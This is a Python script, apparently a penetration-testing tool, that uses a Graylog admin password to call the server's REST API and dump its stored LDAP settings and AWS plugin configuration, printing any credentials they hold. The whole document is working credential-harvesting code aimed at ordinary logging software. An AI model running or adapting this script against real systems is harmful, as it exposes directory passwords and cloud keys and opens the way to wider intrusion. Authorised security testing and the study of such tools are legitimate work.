#!/usr/bin/env python3

# Graylog Obtain Stored Credentials via REST API

#%%%%%%%%%%% Libraries %%%%%%%%%%%#

import requests
from requests.auth import HTTPBasicAuth
import colorama
colorama.init()
from colorama import Fore, Style
import urllib3
import getpass
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#%%%%%%%%%%% Constants %%%%%%%%%%%#

separator = "[*] ============================================================================================================== [*]"

#%%%%%%%%%% Functions %%%%%%%%%#

def obtainldapcredentials(graylogip):

    ldapurl = "http://"+graylogip+":9000/api/system/ldap/settings?pretty=true"
    awspluginurl = "http://"+graylogip+":9000/api/system/cluster_config/org.graylog.aws.config.AWSPluginConfiguration?pretty=true"
    graylogpass = getpass.getpass(Fore.CYAN + Style.BRIGHT + "[!] Enter Graylog Admin Password: " + Style.RESET_ALL)

    try:
        response = requests.get(ldapurl, auth=HTTPBasicAuth('admin',graylogpass))

        if (response.status_code == 200 and "DOCTYPE html" not in response.text):
            print(separator)
            print(Fore.RED + Style.BRIGHT + "[!] Graylog LDAP Settings and Credentials" + Style.RESET_ALL)
            print(separator + response.text.strip('{}').replace('\n','\n[!]'))
        else:
            print(separator)
            print("[!] Error obtaining Graylog LDAP Settings and Credentials")

    except Exception as e:
        print(e)
        pass

    try:
        response = requests.get(awspluginurl, auth=HTTPBasicAuth('admin',graylogpass))

        if (response.status_code == 200 and "DOCTYPE html" not in response.text):
            print(separator)
            print(Fore.RED + Style.BRIGHT + "[!] Graylog AWS Settings and Credentials" + Style.RESET_ALL)
            print(separator + response.text.strip('{}').replace('\n','\n[!]'))
            print(separator)
        else:
            print(separator)
            print("[!] Error obtaining Graylog AWS Settings and Credentials")
            print(separator)

    except Exception as e:
        print(e)
        pass

#%%%%%%%%%% The End %%%%%%%%%%#

